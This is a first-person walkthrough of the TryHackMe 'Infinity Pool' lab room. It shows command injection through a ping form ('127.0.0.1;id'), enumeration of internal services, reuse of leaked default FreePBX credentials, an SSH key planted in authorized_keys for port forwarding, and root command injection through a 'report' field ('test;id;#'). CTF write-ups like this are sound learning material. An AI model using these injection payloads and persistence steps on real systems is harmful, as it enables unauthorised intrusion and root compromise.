# Infinity Pool

> **TryHackMe Room:** [Infinity Pool](https://tryhackme.com/room/hh-infinitypool-5b3548af)

This write-up covers how I approached the room, step by step. Flags and specific key and password values are not included.

## Introduction

This is a classic `boot2root` room involving web exploitation, Linux enumeration, and service-to-service privilege escalation. Writing this up was not part of the original plan, but after finishing the write-up for [After Hours](07-After%20Hours.md), I remembered this room had been unusually tricky to solve when I first attempted it, so I decided to revisit it.

## Initial Access

The `nmap` scan showed two open ports: `22` and `80`. I checked `robots.txt` first and found a few disallowed URLs, then checked the page source and `app.js`, which revealed an allowed URL instead. This led to a page with an input box that pings an IP address. Testing `8.8.8.8` did not return a result (the ping only sends a single packet), but `127.0.0.1` worked.

Based partly on what I remembered from my previous attempt, I tried the following:

```ping
127.0.0.1;id
```

This returned the output of `id`, confirming command injection. I used the same technique to get a reverse shell and retrieved the user flag.

## Privilege Escalation

The web application was running from `/var/www/infinity_pool/edge`. Two other directories existed under `/var/www/infinity_pool/`: `watchtower`, owned and managed by a service of the same name, and `automation`, owned and managed by `root`.

I enumerated running processes:

```bash
ps auxww
```

and listening ports:

```bash
ss -tulnp
```

Both revealed useful leads. The `watchtower` service was listening on `localhost:3000`, and the `automation` service on `localhost:9000`. I queried both with `curl`:

```bash
curl -sS http://127.0.0.1:3000/
curl -sS http://127.0.0.1:9000/
```

The `automation` service on port 9000 returned a 404, but `watchtower` on port 3000 revealed two endpoints: `/api/health` and `/api/config`. The health endpoint returned:

```bash
{"bind":"127.0.0.1:3000","service":"watchtower","status":"ok"}
```

The config endpoint returned:

```bash
{"automation_endpoint":"http://127.0.0.1:9000","note":"internal network only -- do not expose","ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.","telephony_pass":"<REDACTED_PASS>","telephony_portal":"http://127.0.0.1:8080/ucp","telephony_user":"FreePBXUCPTemplateCreator"}
```

I also queried the health endpoint on port 9000, without a clear reason at the time. It returned:

```bash
{"endpoints":{"GET /health":"service status","POST /jobs/export":{"auth":"Authorization: Bearer <automation key>","body":{"report":"<report name>"},"desc":"archive the latest data export"}},"runs_as":"root","service":"automation","status":"ok"}
```

This gave me a path forward: log in to `http://127.0.0.1:8080/ucp` with the default FreePBX template credentials shown in the config endpoint, retrieve something useful from there, and use it to send a request to the `automation` service on port 9000, which runs as root.

Since the reverse shell I had could not reach `localhost` on ports 3000 or 8080, I needed a stable way in. I found an `authorized_keys` file under the `.ssh` folder in the `web` user's home directory, generated a new key pair with `ssh-keygen`, and added the public key to that file. I then port-forwarded through SSH:

```bash
ssh -o IdentitiesOnly=yes -i <KEY_NAME> -L 8080:127.0.0.1:8080 web@<Target_IP>
```

With the forwarded port in place, I logged in to the portal with the credentials found earlier, and found a bearer token in the dashboard's widget section. Based on what I remembered from my previous attempt, I made the following request to the automation service:

```bash
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer <TOKEN_FOUND>' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"latest"}'
```

This returned:

```bash
{"command":"tar czf /var/automation/exports/latest.tgz /var/automation/data 2>&1","output":"tar: Removing leading `/' from member names\n"}
```

The response showed the underlying shell command being built from the `report` value. Changing it to `anything` produced `anything.tgz` in the output, confirming that the value was inserted directly into the command. I then tried `test;id;#`, which returned:

```bash
{"command":"tar czf /var/automation/exports/test;id;#.tgz /var/automation/data 2>&1","output":"uid=0(root) gid=0(root) groups=0(root)\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\n"}
```

The semicolon closed out the original `tar` command, letting `id` run as a separate command, and the `#` commented out the remainder of the line so it would not cause a syntax error. Since the `automation` service runs as root, the injected `id` command executed with root privileges, which is why the output showed `uid=0(root)`. I used `cat /root/root.txt` to read the root flag directly. In hindsight, replacing `id` with a reverse shell command, or reusing the SSH port-forwarding approach from earlier, would likely have worked as well to get an interactive root shell, though I did not try either at the time.

## Conclusion

This room was the second hardest one I have done, behind [Do Not Disturb](04-Do%20Not%20Disturb.md). It taught me several things: generating and using SSH key pairs for port forwarding, watching for internal services running on unusual ports, and how an unsanitized input value can end up concatenated directly into a shell command. I also came across the FreePBX default template credential issue for the first time, a vulnerability distinctive enough that it is named outright in its advisories.
